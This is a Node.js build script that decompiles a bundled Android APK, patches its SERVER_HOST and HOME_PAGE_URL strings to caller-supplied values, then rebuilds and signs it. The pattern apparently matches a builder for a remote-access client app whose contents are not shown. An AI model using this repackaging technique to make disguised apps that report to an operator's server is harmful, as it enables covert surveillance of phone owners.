const cp = require('child_process');
const fs = require('fs');
const path = require('path');
const config = require('./config');

// Progress file path
const progressFile = path.join(config.dbPath, 'build_progress.json');

// Paths
const apkToolPath = path.join(__dirname, '../app/factory/apktool.jar');
const signerPath = path.join(__dirname, '../app/factory/uber-apk-signer.jar');
const rawApkPath = path.join(__dirname, '../app/factory/rawapk/app-debug.apk');
const decompilePath = path.join(__dirname, '../app/factory/decompiled');
const builtApkPath = path.join(config.dbPath, 'built_apks');
const outputApk = path.join(builtApkPath, 'build.apk');
const signedApk = path.join(builtApkPath, 'build.s.apk');

// Default URLs in the APK (these are placeholders that will be patched)
const DEFAULT_SERVER_URL = 'http://127.0.0.1:22533';
const DEFAULT_HOME_PAGE = 'https://google.com';

// Ensure directories exist
if (!fs.existsSync(builtApkPath)) {
    fs.mkdirSync(builtApkPath, { recursive: true });
}

function progress(step, message, complete = false) {
    try {
        fs.writeFileSync(progressFile, JSON.stringify({
            step,
            message,
            complete,
            time: new Date().toISOString()
        }));
    } catch (e) {}
    console.log(`[BUILD] ${step}: ${message}`);
}

function getProgress() {
    try {
        if (fs.existsSync(progressFile)) {
            return JSON.parse(fs.readFileSync(progressFile, 'utf8'));
        }
    } catch (e) {}
    return { step: 'idle', message: 'Ready', complete: false };
}

// ---------------- JAVA CHECK ----------------

function checkJava(cb) {
    progress('java', 'Checking Java...');
    const spawn = cp.spawn('java', ['-version']);
    let output = '';

    spawn.stderr.on('data', d => output += d.toString());
    spawn.on('error', () => cb('Java not found. Install Java 8+'));
    spawn.on('close', () => {
        if (output.includes('version')) {
            progress('java', 'Java detected', true);
            cb(null);
        } else {
            cb('Java not detected');
        }
    });
}

// ---------------- CLEAN ----------------

function cleanDecompiled() {
    try {
        if (fs.existsSync(decompilePath)) {
            fs.rmSync(decompilePath, { recursive: true, force: true });
        }
        fs.mkdirSync(decompilePath, { recursive: true });
        return null;
    } catch (e) {
        return e.message;
    }
}

// ---------------- DECOMPILE ----------------

function decompile(cb) {
    progress('decompile', 'Cleaning workspace...');
    const err = cleanDecompiled();
    if (err) return cb(err);

    if (!fs.existsSync(rawApkPath)) {
        return cb('Raw APK not found in app/factory/rawapk/');
    }

    progress('decompile', 'Decompiling APK...');
    const cmd = `java -jar "${apkToolPath}" d "${rawApkPath}" -o "${decompilePath}" -f`;

    cp.exec(cmd, (error) => {
        if (error) return cb('Decompile failed: ' + error.message);
        progress('decompile', 'Decompiled successfully', true);
        cb(null);
    });
}

// ---------------- DYNAMIC PATCH ----------------

function getAllSmaliDirs() {
    if (!fs.existsSync(decompilePath)) return [];

    return fs.readdirSync(decompilePath)
        .filter(dir => dir.startsWith('smali'))
        .map(dir => path.join(decompilePath, dir));
}

function getAllSmaliFiles(dir) {
    let results = [];

    const list = fs.readdirSync(dir);
    list.forEach(file => {
        const filePath = path.join(dir, file);
        const stat = fs.statSync(filePath);

        if (stat && stat.isDirectory()) {
            results = results.concat(getAllSmaliFiles(filePath));
        } else if (file.endsWith('.smali')) {
            results.push(filePath);
        }
    });

    return results;
}

function patch(serverUrl, homePageUrl, cb) {
    progress('patch', 'Preparing patch data...');

    // Ensure server URL has protocol
    let newServerUrl = serverUrl;
    if (!newServerUrl.startsWith('http://') && !newServerUrl.startsWith('https://')) {
        newServerUrl = 'http://' + newServerUrl;
    }

    // Default home page if not provided
    let newHomePageUrl = homePageUrl || 'https://google.com';
    if (!newHomePageUrl.startsWith('http://') && !newHomePageUrl.startsWith('https://')) {
        newHomePageUrl = 'https://' + newHomePageUrl;
    }

    const smaliDirs = getAllSmaliDirs();
    let serverUrlPatched = 0;
    let homePagePatched = 0;

    if (smaliDirs.length === 0)
        return cb('No smali directories found');

    try {
        progress('patch', 'Scanning and patching smali files...');
        
        smaliDirs.forEach(dir => {
            const files = getAllSmaliFiles(dir);

            files.forEach(file => {
                let data = fs.readFileSync(file, 'utf8');
                let modified = false;

                // Patch 1: SERVER_HOST field definition
                // .field public static final SERVER_HOST:Ljava/lang/String; = "http://127.0.0.1:22533"
                const serverHostFieldRegex = /(\.field\s+[^\n]*\bSERVER_HOST:Ljava\/lang\/String;[^\n]*=\s*")[^"]*(")/g;
                if (serverHostFieldRegex.test(data)) {
                    data = data.replace(serverHostFieldRegex, `$1${newServerUrl}$2`);
                    modified = true;
                    serverUrlPatched++;
                }

                // Patch 2: HOME_PAGE_URL field definition
                // .field public static final HOME_PAGE_URL:Ljava/lang/String; = "https://google.com"
                const homePageFieldRegex = /(\.field\s+[^\n]*\bHOME_PAGE_URL:Ljava\/lang\/String;[^\n]*=\s*")[^"]*(")/g;
                if (homePageFieldRegex.test(data)) {
                    data = data.replace(homePageFieldRegex, `$1${newHomePageUrl}$2`);
                    modified = true;
                    homePagePatched++;
                }

                // Patch 3: const-string with default server URL (handles inlining)
                // const-string v0, "http://127.0.0.1:22533"
                const constStringServerRegex = new RegExp(
                    '(const-string\\s+v\\d+,\\s*")' + escapeRegex(DEFAULT_SERVER_URL) + '(")',
                    'g'
                );
                if (constStringServerRegex.test(data)) {
                    data = data.replace(constStringServerRegex, `$1${newServerUrl}$2`);
                    modified = true;
                    serverUrlPatched++;
                }

                // Patch 4: const-string with default home page URL
                // const-string v0, "https://google.com"
                const constStringHomeRegex = new RegExp(
                    '(const-string\\s+v\\d+,\\s*")' + escapeRegex(DEFAULT_HOME_PAGE) + '(")',
                    'g'
                );
                if (constStringHomeRegex.test(data)) {
                    data = data.replace(constStringHomeRegex, `$1${newHomePageUrl}$2`);
                    modified = true;
                    homePagePatched++;
                }

                // Patch 5: Any hardcoded reference to the default URL (catch-all)
                // This handles cases where the URL might appear in different contexts
                const genericServerUrlRegex = new RegExp(escapeRegex(DEFAULT_SERVER_URL), 'g');
                if (genericServerUrlRegex.test(data)) {
                    data = data.replace(genericServerUrlRegex, newServerUrl);
                    modified = true;
                    serverUrlPatched++;
                }

                const genericHomeUrlRegex = new RegExp(escapeRegex(DEFAULT_HOME_PAGE), 'g');
                if (homePageUrl && genericHomeUrlRegex.test(data)) {
                    data = data.replace(genericHomeUrlRegex, newHomePageUrl);
                    modified = true;
                    homePagePatched++;
                }

                if (modified) {
                    fs.writeFileSync(file, data, 'utf8');
                }
            });
        });

        if (serverUrlPatched === 0)
            return cb('Could not find server URL to patch. APK may be corrupted or already patched.');

        progress('patch', `Patched SERVER_HOST: ${serverUrlPatched} occurrences, HOME_PAGE_URL: ${homePagePatched} occurrences`, true);
        cb(null);

    } catch (e) {
        cb('Patch failed: ' + e.message);
    }
}

// Helper function to escape special regex characters
function escapeRegex(string) {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ---------------- BUILD ----------------

function build(cb) {
    progress('build', 'Building APK...');
    const cmd = `java -jar "${apkToolPath}" b "${decompilePath}" -o "${outputApk}"`;

    cp.exec(cmd, (error) => {
        if (error) return cb('Build failed: ' + error.message);
        progress('build', 'APK built successfully', true);
        cb(null);
    });
}

// ---------------- SIGN ----------------

function sign(cb) {
    progress('sign', 'Signing APK...');
    const cmd = `java -jar "${signerPath}" --apks "${outputApk}" --overwrite`;

    cp.exec(cmd, (error) => {
        if (error) return cb('Signing failed: ' + error.message);

        try {
            fs.copyFileSync(outputApk, signedApk);
        } catch (e) {
            return cb('Copy failed: ' + e.message);
        }

        progress('sign', 'Signed successfully', true);
        cb(null);
    });
}

// ---------------- CLEANUP ----------------

function cleanup() {
    progress('cleanup', 'Cleaning temporary files...');
    cleanDecompiled();
    progress('cleanup', 'Done', true);
}

// ---------------- MAIN ----------------

function buildApk(serverUrl, homePageUrl, cb) {
    if (!serverUrl) return cb('Server URL required');

    // Validate and parse URL
    let parsedUrl = serverUrl;
    if (!parsedUrl.startsWith('http://') && !parsedUrl.startsWith('https://')) {
        parsedUrl = 'http://' + parsedUrl;
    }

    try {
        const urlObj = new URL(parsedUrl);
        if (!urlObj.hostname) return cb('Invalid URL: no hostname');
    } catch (e) {
        return cb('Invalid server URL format');
    }

    checkJava(err => {
        if (err) return cb(err);

        decompile(err => {
            if (err) return cb(err);

            patch(serverUrl, homePageUrl, err => {
                if (err) return cb(err);

                build(err => {
                    if (err) return cb(err);

                    sign(err => {
                        if (err) return cb(err);

                        cleanup();
                        progress('done', 'Build completed!', true);
                        cb(null);
                    });
                });
            });
        });
    });
}

module.exports = { buildApk, getProgress, signedApk };
